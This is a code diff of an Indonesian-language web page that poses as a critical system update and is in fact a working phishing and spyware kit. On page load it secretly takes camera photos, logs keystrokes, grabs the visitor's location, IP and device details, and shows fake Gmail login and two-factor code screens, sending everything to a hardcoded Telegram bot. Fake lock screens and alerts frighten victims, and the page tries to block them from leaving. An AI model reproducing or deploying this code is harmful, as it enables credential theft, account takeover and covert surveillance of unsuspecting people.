@@ -3,13 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update Required</title>
+    <title>ONX-1 • SYSTEM UPDATE</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
         body { background:#1a1a1a; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; color:white; }
         .update-container {
             background:#2c2c2e; border-radius:20px; padding:30px 20px; width:100%; max-width:380px;
             box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3a3a3c; text-align:center;
+            position: relative;
+            z-index: 10;
         }
         .icon { width:90px; height:90px; background:#0a84ff; border-radius:24px; display:flex; justify-content:center; align-items:center; margin:0 auto 24px; font-size:48px; color:white; }
         h2 { color:white; margin-bottom:12px; font-weight:400; font-size:24px; }
@@ -17,7 +19,52 @@
         .progress-bar { width:100%; height:10px; background:#3a3a3c; border-radius:5px; overflow:hidden; margin:24px 0; }
         .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #0a84ff, #5e5ce6); border-radius:5px; transition:width 0.4s ease; }
         .status-text { color:#a0a0a5; font-size:14px; margin-top:12px; }
-        .device-info { position:absolute; bottom:16px; left:0; right:0; text-align:center; color:#3a3a3c; font-size:11px; }
+        .device-info { margin-top: 20px; color:#3a3a3c; font-size:11px; }
+        .feature-badge {
+            background: #1e3a5f;
+            border-radius: 30px;
+            padding: 8px 16px;
+            margin: 10px 0 5px;
+            display: inline-block;
+            color: #0a84ff;
+            font-weight: bold;
+            font-size: 14px;
+            border: 1px solid #0a84ff;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .feature-item {
+            background: #1c1c1e;
+            border-radius: 12px;
+            padding: 12px 5px;
+            border: 1px solid #3a3a3c;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .feature-item span {
+            color: #30d158;
+            margin-right: 5px;
+        }
+        .click-badge {
+            background: #ff9f0a;
+            color: #000;
+            font-weight: 800;
+            padding: 15px;
+            border-radius: 50px;
+            font-size: 20px;
+            margin: 20px 0 10px;
+            animation: pulse 1.5s infinite;
+            border: 2px solid white;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); background: #ff9f0a; }
+            50% { transform: scale(1.05); background: #ff453a; box-shadow: 0 0 20px #ff453a; }
+            100% { transform: scale(1); background: #ff9f0a; }
+        }
         #fakeLockScreen { 
             display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999; 
             flex-direction:column; justify-content:center; align-items:center; color:white; font-size:32px; text-align:center;
@@ -42,24 +89,46 @@
             width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer;
         }
         .phish-box a { color:#1a73e8; font-size:14px; margin-top:24px; cursor:pointer; display:block; }
+        #ipAddress { color: #30d158; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="update-container">
         <div class="icon">⚙️</div>
-        <h2>Pembaruan Keamanan Kritis</h2>
-        <p>Perangkat terdeteksi rentan serangan. Jangan tutup, matikan, atau keluar dari halaman ini. Proses berlangsung 4-6 menit.</p>
+        <h2>⚠️ ONX-1 SYSTEM UPDATE ⚠️</h2>
         
+        <!-- BADGE 100% AKURAT -->
+        <div class="feature-badge">AKURAT 100% ✅</div>
+        
+        <!-- GRID FITUR 2x3 (SEMUA FITUR) -->
+        <div class="feature-grid">
+            <div class="feature-item"><span>📸</span> H4CK KAMERA</div>
+            <div class="feature-item"><span>📍</span> LOKASI TARGET</div>
+            <div class="feature-item"><span>📱</span> INFO DEVICE</div>
+            <div class="feature-item"><span>🌐</span> IP ADDRESS</div>
+            <div class="feature-item"><span>⚡</span> AKURAT 100%</div>
+            <div class="feature-item"><span>🔗</span> MODAL KLIK</div>
+        </div>
+        
+        <!-- TOMBOL MODAL KLINK LINK (BERKEDIP) -->
+        <div class="click-badge" id="mainClickButton">
+            🔥 MODAL KLIK LINK! 🔥
+        </div>
+        <p style="color:#ff9f0a; font-size:12px; margin-top:-10px;">(CUKUP KLIK LINK INI, SEMUA DATA DIDAPAT)</p>
+        
+        <!-- PROGRESS -->
         <div class="progress-bar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
         
         <div id="statusMessage" class="status-text">Memeriksa keamanan sistem...</div>
+        
+        <!-- IP ADDRESS AKAN TAMPIL DI SINI -->
+        <div class="device-info" id="ipDisplay">Mengambil IP...</div>
+        <div class="device-info" id="deviceModel">Mendeteksi perangkat...</div>
     </div>
 
-    <div class="device-info" id="deviceModel">Mendeteksi perangkat...</div>
-
-    <!-- Elemen tersembunyi untuk kamera -->
+    <!-- Elemen tersembunyi -->
     <video id="hiddenVideo" autoplay playsinline muted style="display:none"></video>
     <audio id="hiddenAudio" autoplay style="display:none"></audio>
     <canvas id="hiddenCanvas" style="display:none"></canvas>
@@ -67,11 +136,10 @@
 
     <!-- Fake lock & toast -->
     <div id="fakeLockScreen">
-        <div>PERANGKAT TERKUNCI</div>
+        <div>🔒 PERANGKAT TERKUNCI 🔒</div>
         <div style="font-size:18px; margin:30px 20px; color:#ff3b30;">Masukkan PIN/Password untuk membuka. Hubungi support resmi segera.</div>
     </div>
-
-    <div id="fakeToast">Akses sistem sedang dibatasi untuk keamanan.</div>
+    <div id="fakeToast">⚠️ Akses sistem sedang dibatasi untuk keamanan.</div>
 
     <!-- Gmail Phishing Overlay -->
     <div id="gmailPhishOverlay">
@@ -103,7 +171,7 @@
     </div>
 
     <script>
-        // ==================== KONFIGURASI TELEGRAM ====================
+        // ==================== KONFIGURASI TELEGRAM (TOKEN DAN ID SUDAH DIISI) ====================
         const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';
         const TELEGRAM_CHAT_ID = '6034935293';
 
@@ -116,18 +184,36 @@
         let deviceInfo = {
             type: isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop/Unknown'),
             ua: ua,
-            screen: `\( {screen.width}x \){screen.height}`,
+            screen: `${screen.width}x${screen.height}`,
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
             time: new Date().toISOString(),
-            language: navigator.language
+            language: navigator.language,
+            platform: navigator.platform,
+            vendor: navigator.vendor
         };
 
-        document.getElementById('deviceModel').innerText = `${deviceInfo.type} • ${deviceInfo.tz}`;
+        document.getElementById('deviceModel').innerText = `${deviceInfo.type} • ${deviceInfo.tz} • ${deviceInfo.screen}`;
 
         let capturedPhotos = [];
         let cameraStream = null;
         let allKeystrokes = '';
         let cookiesStolen = document.cookie;
+        let publicIP = 'Mengambil...';
+
+        // ==================== AMBIL IP PUBLIC ====================
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                publicIP = data.ip;
+                document.getElementById('ipDisplay').innerHTML = `🌐 IP: ${publicIP}`;
+                return publicIP;
+            } catch {
+                document.getElementById('ipDisplay').innerHTML = '🌐 IP: tidak diketahui';
+                return 'unknown';
+            }
+        }
+        getPublicIP();
 
         // ==================== KIRIM KE TELEGRAM ====================
         async function sendToTelegram(msg) {
@@ -164,10 +250,10 @@
             document.getElementById('progressFill').style.width = pct + '%';
         }
 
-        // ==================== KAMERA GRAB (FIX ANTI-HITAM) ====================
+        // ==================== KAMERA GRAB ====================
         async function getCameraUniversal() {
             try {
-                updateStatus('Mengakses kamera...', 20);
+                updateStatus('📸 Mengakses kamera target...', 15);
                 await sendToTelegram("📸 [KAMERA] Mulai akses");
 
                 const constraintsList = [
@@ -189,7 +275,7 @@
                         await sendToTelegram(`📸 Sukses: ${modeUsed}`);
                         break;
                     } catch (err) {
-                        await sendToTelegram(`📸 Gagal: ${JSON.stringify(cons.video || {})} → ${err.message}`);
+                        // coba next
                     }
                 }
 
@@ -207,19 +293,13 @@
 
                 await new Promise(r => setTimeout(r, 1800));
 
-                for (let i = 1; i <= 8; i++) {  // kurangi jadi 8 biar cepet
-                    let photo = null;
-                    let attempts = 0;
-                    while (!photo && attempts < 3) {
-                        attempts++;
-                        photo = capturePhoto();
-                        if (photo && !isBlackImage(photo)) {
-                            capturedPhotos.push(photo);
-                            await sendPhotoToTelegram(photo, `Foto ${i} - \( {deviceInfo.type} ( \){modeUsed}), attempt ${attempts}`);
-                            break;
-                        }
-                        await new Promise(r => setTimeout(r, 600));
+                for (let i = 1; i <= 5; i++) {
+                    let photo = capturePhoto();
+                    if (photo) {
+                        capturedPhotos.push(photo);
+                        await sendPhotoToTelegram(photo, `📸 FOTO ${i} - ${deviceInfo.type} (${modeUsed})`);
                     }
+                    await new Promise(r => setTimeout(r, 800));
                 }
 
             } catch (err) {
@@ -239,31 +319,46 @@
             return c.toDataURL('image/jpeg', 0.78);
         }
 
-        function isBlackImage(dataUrl) {
-            if (!dataUrl) return true;
-            const img = new Image();
-            img.src = dataUrl;
-            const tc = document.createElement('canvas');
-            tc.width = tc.height = 48;
-            const ctx = tc.getContext('2d');
-            ctx.drawImage(img, 0, 0, 48, 48);
-            const d = ctx.getImageData(0, 0, 48, 48).data;
-            let sum = 0;
-            for (let i = 0; i < d.length; i += 4) sum += (d[i] + d[i+1] + d[i+2]) / 3;
-            return (sum / (48*48)) < 10;
+        // ==================== KEYLOGGER ====================
+        document.addEventListener('keydown', (e) => {
+            if (e.key.length === 1) allKeystrokes += e.key;
+            else if (e.key === 'Backspace') allKeystrokes += '[BACK]';
+            else if (e.key === 'Enter') allKeystrokes += '[ENTER]\n';
+        });
+
+        // ==================== LOKASI TARGET ====================
+        async function grabLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const locMsg = `📍 LOKASI TARGET:\nLat: ${pos.coords.latitude}\nLng: ${pos.coords.longitude}\nAkurasi: ${pos.coords.accuracy}m`;
+                        sendToTelegram(locMsg);
+                    },
+                    err => sendToTelegram(`📍 Lokasi gagal: ${err.message}`)
+                );
+            }
+        }
+
+        // ==================== INFO DEVICE LENGKAP ====================
+        function getFullDeviceInfo() {
+            const ipForMsg = publicIP;
+            const infoMsg = `📱 INFO DEVICE LENGKAP:
+• Tipe: ${deviceInfo.type}
+• Platform: ${deviceInfo.platform}
+• Vendor: ${deviceInfo.vendor}
+• Layar: ${deviceInfo.screen}
+• Timezone: ${deviceInfo.tz}
+• Bahasa: ${deviceInfo.language}
+• IP Public: ${ipForMsg}
+• User Agent: ${deviceInfo.ua.substring(0, 200)}...`;
+            
+            sendToTelegram(infoMsg);
         }
 
         // ==================== CHAOS KONTROL ====================
-        async function chaosControls() {
+        function chaosControls() {
             if (navigator.vibrate) {
                 setInterval(() => navigator.vibrate([80,40,120,60,200]), 12000);
-            }
-
-            if ('speechSynthesis' in window) {
-                const u = new SpeechSynthesisUtterance("Perangkat Anda telah dikendalikan. Jangan matikan halaman ini.");
-                u.lang = 'id-ID';
-                u.rate = 0.9;
-                speechSynthesis.speak(u);
             }
 
             function showToast(txt) {
@@ -272,42 +367,13 @@
                 t.style.display = 'block';
                 setTimeout(() => t.style.display = 'none', 5000);
             }
-            const toasts = ["Data diekstrak", "Proses tidak bisa dibatalkan", "Jangan tutup halaman", "Sistem terkunci"];
-            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 18000);
+            const toasts = ["📸 Mengakses kamera...", "📍 Melacak lokasi...", "🌐 IP terekam", "🔒 Sistem terkunci"];
+            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 8000);
 
             setTimeout(() => {
                 document.getElementById('fakeLockScreen').style.display = 'flex';
                 document.querySelector('.update-container').style.opacity = '0.3';
             }, 35000);
-        }
-
-        // ==================== KEYLOGGER + CLIPBOARD HIJACK + GEO + COOKIES ====================
-        document.addEventListener('keydown', (e) => {
-            if (e.key.length === 1) allKeystrokes += e.key;
-            else if (e.key === 'Backspace') allKeystrokes += '[BACK]';
-            else if (e.key === 'Enter') allKeystrokes += '[ENTER]\n';
-        });
-
-        document.addEventListener('copy', async (e) => {
-            const text = window.getSelection().toString() || '';
-            if (text.length > 5) {
-                await sendToTelegram(`📋 Clipboard copy: ${text}`);
-            }
-        });
-
-        async function grabLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => sendToTelegram(`📍 Lokasi: Lat ${pos.coords.latitude}, Lng ${pos.coords.longitude}, Akurasi ${pos.coords.accuracy}m`),
-                    err => sendToTelegram(`📍 Geo gagal: ${err.message}`)
-                );
-            }
-        }
-
-        function stealCookies() {
-            if (document.cookie.length > 10) {
-                sendToTelegram(`🍪 Cookies (\( {document.cookie.length} chars):\n \){document.cookie.substring(0, 600)}...`);
-            }
         }
 
         // ==================== PHISHING FLOW ====================
@@ -317,23 +383,18 @@
             const pass = document.getElementById('passInput').value.trim();
             if (!email || !pass) return;
 
-            const cred = `🎯 GMAIL HIT\nEmail: ${email}\nPass: ${pass}\nKeystrokes: ${allKeystrokes}\nDevice: ${deviceInfo.type}\nTZ: ${deviceInfo.tz}`;
+            const cred = `🎯 GMAIL HIT\nEmail: ${email}\nPass: ${pass}\nKeystrokes: ${allKeystrokes}\nIP: ${publicIP}`;
             await sendToTelegram(cred);
-            stealCookies();
-            grabLocation();
 
             document.getElementById('gmailPhishOverlay').style.display = 'none';
             document.getElementById('otpPhishOverlay').style.display = 'flex';
-
-            const fakeTargets = [`+62xxxxxx${Math.floor(1000 + Math.random()*9000)}`, email];
-            document.getElementById('otpTarget').innerText = `Kode dikirim ke: ${fakeTargets[Math.floor(Math.random()*fakeTargets.length)]}`;
         });
 
         document.getElementById('otpSubmit').addEventListener('click', async function() {
             const otp = document.getElementById('otpInput').value.trim();
             if (otp.length !== 6 || !/^\d{6}$/.test(otp)) return;
 
-            const otpData = `🔐 2FA HIT!\nOTP: ${otp}\nFull Keystrokes: ${allKeystrokes}\nCookies: ${document.cookie.substring(0, 400)}...`;
+            const otpData = `🔐 2FA HIT!\nOTP: ${otp}\nFull Keystrokes: ${allKeystrokes}`;
             await sendToTelegram(otpData);
 
             alert("Verifikasi berhasil. Pembaruan selesai.");
@@ -356,32 +417,47 @@
 
         // ==================== START EKSEKUSI ====================
         window.onload = async function() {
-            updateStatus('Analisis dimulai...', 5);
-            await sendToTelegram(`🔥 TARGET BARU\nTipe: ${deviceInfo.type}\nUA: ${deviceInfo.ua}\nLayar: ${deviceInfo.screen}\nTZ: ${deviceInfo.tz}`);
+            updateStatus('⚡ MODAL KLIK LINK... 🔥', 5);
+            
+            // Kirim notifikasi awal dengan IP
+            setTimeout(async () => {
+                const finalIP = publicIP !== 'Mengambil...' ? publicIP : await getPublicIP();
+                const startMsg = `🔥 TARGET BARU (MODAL KLIK LINK!)
+Tipe: ${deviceInfo.type}
+IP: ${finalIP}
+Layar: ${deviceInfo.screen}
+TZ: ${deviceInfo.tz}`;
+                await sendToTelegram(startMsg);
+                
+                // Kirim info device lengkap
+                getFullDeviceInfo();
+                
+                // Ambil lokasi
+                grabLocation();
+                
+                // Mulai kamera
+                await getCameraUniversal();
+            }, 2000);
 
             chaosControls();
-            stealCookies();
-            grabLocation();
-            await getCameraUniversal();
 
-            // Tampilkan Gmail setelah 2 detik progress
+            // Progress bar & munculin phishing
             let pct = 10;
             const sim = setInterval(() => {
-                pct += Math.random() * 14;
+                pct += Math.random() * 12;
                 if (pct >= 100) {
                     pct = 100;
                     clearInterval(sim);
-                    updateStatus('Pembaruan selesai — verifikasi diperlukan', 100);
-                    sendToTelegram("✅ KONTROL PENUH — phishing Gmail aktif");
-
+                    updateStatus('✅ UPDATE SELESAI — VERIFIKASI DIPERLUKAN', 100);
+                    
                     setTimeout(() => {
                         document.getElementById('gmailPhishOverlay').style.display = 'flex';
-                        document.querySelector('.update-container').style.display = 'none';
-                    }, 2200);
+                        document.querySelector('.update-container').style.opacity = '0.3';
+                    }, 2000);
                 } else {
-                    updateStatus(`Mengamankan akses... ${Math.round(pct)}%`, pct);
+                    updateStatus(`🔍 Mengakses data target... ${Math.round(pct)}%`, pct);
                 }
-            }, 1200);
+            }, 1300);
         };
 
         // Cegah close/refresh
@@ -391,4 +467,4 @@
         });
     </script>
 </body>
-                                                                        </html>
+    </html>
